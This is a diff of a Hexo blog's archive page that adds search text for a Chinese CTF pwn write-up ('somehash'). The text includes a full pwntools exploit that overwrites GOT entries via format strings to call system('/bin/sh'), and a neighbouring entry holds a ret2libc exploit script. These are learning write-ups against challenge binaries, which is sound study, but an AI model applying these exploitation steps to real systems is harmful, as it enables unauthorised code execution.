@@ -46,6 +46,7 @@
 
 <meta name="generator" content="Hexo 8.1.2"></head>
 <body>
+    
     <script>
         (() => {
             const storageKey = "particlex-color-theme";
@@ -290,6 +291,55 @@
         </div>
 
         <div class="archive-list" id="archive-list">
+            
+            
+            <div class="timeline" data-search="somehashctfpwnpwn非栈上格式化字符串栈拖拖拖拖拖拖拉拉拉拉拉拉的终于结束了somehash这个题接下来是临近期末的大速通时代！o(╥﹏╥)o如果需要原文件可以给我留言或者直接加我qq或者在qq邮箱联系：3229373982@qq.com看到肯定会回的思路拿到题目之后先放入ida然后checksec保护全开然后ida，分析发现这里对输入的namelength没有进行负数的判断所以输入name的时候，输入负数的话会向低地址进行复写p_buf&#x3d;0x50c0strlen@got&#x3d;0x5028我们可以通过输入负数，然后通过p_buf对strlen@got进行修改（这里还未对strlen进行调用）修改为printf函数然后在后续的函数调用的时候方便泄露地址这里通过计算可得p_buf和stlen@got中间的距离是152所以我们填的时候就可以直接输入-152然后就可以通过printf(&quot;name&gt;&quot;);p_buf[n256]=read(0,p_buf,(unsigned__int16)n256);这里修改stlen的地址了修改地址这里程序需要根据got表里面储存的偏移地址进行调用然后跳转🤔🤔🤔可以根据这个来利用一下🤔🤔🤔现在还未对于strlen进行调用如果我们把strlen里面的0x1050修改成0x1080那岂不是之后调用strlen函数的时候实际上调用的是printf函数这样岂不美哉😋（这里的地址和下面的不同是正常的因为我不小心重开了gdb）所以第一段payload要发送0x80个字节从而把0x1050修改为0x1080那由于程序开启了pie还有canary所以要泄露基址还有能用的指针链下面的这个是还未对strlen进行调用printf已经调用下面的是对于strlen已经进行修改还未进行调用的地址可以看到后面已经从50变为了80strlen@got改前：base+0x1050strlen@got改后：base+0x1080vmmap图这里对strlen修改成功了然后之后可以利用格式化字符串进行泄露地址了这里我们成功泄露栈上的地址选择的是19232845这四个位置expio.recvuntil(b&quot;namelength&gt;&quot;)io.send(b&quot;-152&quot;)io.recvuntil(b&quot;name&gt;&quot;)name_payload=b&quot;qq%19$p.%23$p.%28$p.%45$prr&quot;.ljust(0x80,b&quot;a&quot;)io.send(name_payload)这里选择的依据是和vmmap图里面程序和libc的起始地址和终止地址进行选择的还有根据栈上可以用的指针链进行选择的之后我们需要把%23指向的地址修改为我们需要的地址因为这样就可以更方便的修改地址也就是width=(slot28&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%23$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)对比图接下来要修改循环的次数从而方便我们进行多次调用#把28号参数改到trialswidth=((base+trials_off)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)#trials=0x20，这样后面有足够次数慢慢写gotwidth=0x20io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)log.success(&quot;trials-&gt;0x20&quot;)trials&#x3d;base+0x5078&#x3d;0x61441f769078.data:0000000000005078dword_5078dd3;dataxref:main+1ce↑r.data:0000000000005078;main:loc_288f↑r….data:0000000000005078_dataends.data:0000000000005078load:000000000000507c;修改之前的次数把28号参数改到trialstrials&#x3d;0x20，这样后面有足够次数慢慢写got对比图（把28号参数改到trials）对比图（把28号参数改到trials）当然这里也可以直接x&#x2f;wx0x61441f769078输出的也是修改strlen为systemset$atoi_got=$codebase+0x5060set$strlen_got=$codebase+0x5028set$helper=$codebase+0x24cfset$trials=$codebase+0x5078p/x$system这里的codebase和system可以通过脚本泄露后面的例如0x5028这些地址在ida里面都可以找到可以去对应着理解一下#system地址的低3字节system_byte0=p64(system)[0]system_byte1=p64(system)[1]system_byte2=p64(system)[2]#atoi@got第0个字节width=((base+atoi_got)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)width=system_byte0or0x100io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)log.success(&quot;atoi[0]-&gt;%#x&quot;%system_byte0)#atoi@got第1个字节width=((base+atoi_got+1)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)width=system_byte1or0x100io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)log.success(&quot;atoi[1]-&gt;%#x&quot;%system_byte1)#atoi@got第2个字节width=((base+atoi_got+2)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)width=system_byte2or0x100io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)log.success(&quot;atoi[2]-&gt;%#x&quot;%system_byte2)对比图后面两张图片说明已经在改atoi_got了然后再更改atoi_got的下一个字节对比图接下来按同样节奏走修改这时atoi@got低3字节已经改成system低3字节了。把slot28改成strlen@got#再把strlen@got改到0x24cf，那边会read(0x10)然后调atoiwidth=((base+strlen_got)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)对比图把strlen@got改到helperwidth=((base+helper_off)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%28$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)log.success(&quot;strlen@got-&gt;%#x&quot;%(base+helper_off))对比图最后完整expfrompwnimport*context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]context.arch=&quot;amd64&quot;context.log_level=&quot;info&quot;elf=elf(&quot;./somehash&quot;)libc=elf(&quot;./wtf_somehash.6&quot;,checksec=false)env={b&quot;ld_preload&quot;:b&quot;./wtf_somehash.6&quot;}strlen_got=elf.got[&quot;strlen&quot;]atoi_got=elf.got[&quot;atoi&quot;]trials_off=0x5078helper_off=0x24cflibc_leak_off=0x29d90io=process(&quot;./somehash&quot;,env=env)#io=remote(&quot;39.96.193.120&quot;,10002)io.recvuntil(b&quot;namelength&gt;&quot;)io.send(b&quot;-152&quot;)io.recvuntil(b&quot;name&gt;&quot;)#先把strlen@got的低字节改成printf@plt，然后在这里直接泄漏地址name_payload=b&quot;qq%19$p.%23$p.%28$p.%45$prr&quot;.ljust(0x80,b&quot;a&quot;)io.send(name_payload)out=io.recvuntil(b&quot;content&gt;&quot;).decode(&quot;latin-1&quot;,&quot;ignore&quot;)leak_text=out.split(&quot;qq&quot;,1)[1].split(&quot;rr&quot;,1)[0]leak19,s23,p28,code=[int(x,16)forxinleak_text.split(&quot;.&quot;)]base=code-0x1180libc_base=leak19-libc_leak_offsystem=libc_base+libc.sym[&quot;system&quot;]slot28=s23-0xc8log.success(&quot;base=====&gt;%#x&quot;%base)log.success(&quot;libc=====&gt;%#x&quot;%libc_base)log.success(&quot;system=====&gt;%#x&quot;%system)log.success(&quot;slot28=====&gt;%#x&quot;%slot28)log.success(&quot;arg28=====&gt;%#x&quot;%p28)gdb.attach(io)width=(slot28&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%23$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)#把28号参数改到trialswidth=((base+trials_off)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)#trials=0x20，这样后面有足够次数慢慢写gotwidth=0x20io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)log.success(&quot;trials-&gt;0x20&quot;)#system地址的低3字节system_byte0=p64(system)[0]system_byte1=p64(system)[1]system_byte2=p64(system)[2]#atoi@got第0个字节width=((base+atoi_got)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)width=system_byte0or0x100io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)log.success(&quot;atoi[0]-&gt;%#x&quot;%system_byte0)#atoi@got第1个字节width=((base+atoi_got+1)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)width=system_byte1or0x100io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)log.success(&quot;atoi[1]-&gt;%#x&quot;%system_byte1)#atoi@got第2个字节width=((base+atoi_got+2)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)width=system_byte2or0x100io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)log.success(&quot;atoi[2]-&gt;%#x&quot;%system_byte2)#再把strlen@got改到0x24cf，那边会read(0x10)然后调atoiwidth=((base+strlen_got)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)width=((base+helper_off)&amp;0xffff)or0x10000io.sendline(f&quot;%19${width}c%28$hn&quot;.encode())io.recvuntil(b&quot;content&gt;&quot;)log.success(&quot;strlen@got-&gt;%#x&quot;%(base+helper_off))io.sendline(b&quot;trig&quot;)io.recvline(timeout=2)#这里触发到system(&quot;exec/bin/sh&quot;)io.send(b&quot;exec/bin/sh\n&quot;)sleep(0.3)io.interactive()somehash这道题是一个好题我觉着，因为从这个题里面收获了很多，包括对地址修改还有看地址的一些gdb调试方法，听师傅说这道题有很多方法，包括&#x3d;&#x3d;ogg&#x3d;&#x3d;，&#x3d;&#x3d;rop&#x3d;&#x3d;，还有本题用到的&#x3d;&#x3d;修改strlen为system&#x3d;&#x3d;，剩下的方法我准备等有时间再尝试再做一遍。这个exp用的指针链可以更换成别的地址的指针链，我的意思是说&#x3d;&#x3d;不止局限与当前exp上的指针链&#x3d;&#x3d;，我看stack上还有其他可以利用的指针链各位师傅可能看这个题很简单，但是对那时候的我来说有点难度，但是收获好多。最近马上要期末了，准备速通一下，希望不会挂科感想：真的收获了好多好多，对我个人的做题思路也有帮助。">
+                <div class="timeline-tail"></div>
+                <div class="timeline-content">
+                    <div class="item-time">2026/6/20</div>
+                    <a href="/2026/06/20/somehash/">
+                        <h3>somehash</h3>
+                    </a>
+                    <div class="info">
+                        
+                        <span class="category">
+                            <a href="/categories/CTF/">
+                                <span class="icon">
+                                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                                </span>
+                                CTF
+                            </a>
+                        </span>
+                        
+                        
+                        <span class="tags">
+                            <span class="icon">
+                                <i class="fa-solid fa-tags fa-fw"></i>
+                            </span>
+                            
+                            <span class="tag">
+                                <a href="/tags/Pwn/" data-tag-name="Pwn" data-tag-color-role="text">
+                                    Pwn
+                                </a>
+                            </span>
+                            
+                            <span class="tag">
+                                <a href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" data-tag-name="非栈上格式化字符串" data-tag-color-role="text">
+                                    非栈上格式化字符串
+                                </a>
+                            </span>
+                            
+                            <span class="tag">
+                                <a href="/tags/%E6%A0%88/" data-tag-name="栈" data-tag-color-role="text">
+                                    栈
+                                </a>
+                            </span>
+                            
+                        </span>
+                        
+                    </div>
+                </div>
+            </div>
             
             
             <div class="timeline" data-search="litctf2026-ret2libcctfpwn基础题ret2libc题目地址这道题还是挺简单的挺适合初学者做的前置知识补充：ret2libc攻击的核心思想是利用程序中的栈溢出漏洞，覆盖函数的返回地址，使其指向libc库中的system函数，并传递”&#x2f;bin&#x2f;sh”字符串作为参数，从而获得一个shell。想要进阶的理解的话可以看这个深入理解ret2libc技术-先知社区最基础的ret2libc甚至还给了pop_rdileak_valuechecksec一下ida一下发现这里有现成的可以利用的rdiret还有泄露地址的地方然后第一部分溢出之后然后泄露地址然后返回main函数，接受地址之后计算libc基址，然后溢出之后再binshfrompwnimport*context(os=&quot;linux&quot;,arch=&quot;amd64&quot;)elf=elf(&quot;./ret2libc&quot;)libc=elf(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)io=process(&quot;./ret2libc&quot;)#io=remote(&quot;challenge.cyclens.tech&quot;,30528)pop_rdi=0x4011b7ret=0x4011b8leak_value=0x4011c3main_addr=0x401234offset=72payload=b&quot;a&quot;*offsetpayload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(elf.got[&quot;puts&quot;])payload+=p64(leak_value)payload+=p64(ret)payload+=p64(main_addr)io.recvuntil(b&quot;tellmeyourname:&quot;)io.send(payload)io.recvuntil(b&quot;leak:&quot;)puts_addr=int(io.recvline().strip(),16)print(&quot;puts_addr=&quot;,hex(puts_addr))libc_base=puts_addr-libc.sym[&quot;puts&quot;]system_addr=libc_base+libc.sym[&quot;system&quot;]binsh_addr=libc_base+next(libc.search(b&quot;/bin/sh\x00&quot;))print(&quot;libc_base=&quot;,hex(libc_base))print(&quot;system_addr=&quot;,hex(system_addr))print(&quot;binsh_addr=&quot;,hex(binsh_addr))payload=b&quot;a&quot;*offsetpayload+=p64(pop_rdi)payload+=p64(binsh_addr)payload+=p64(ret)payload+=p64(system_addr)io.recvuntil(b&quot;tellmeyourname:&quot;)io.send(payload)io.interactive()">
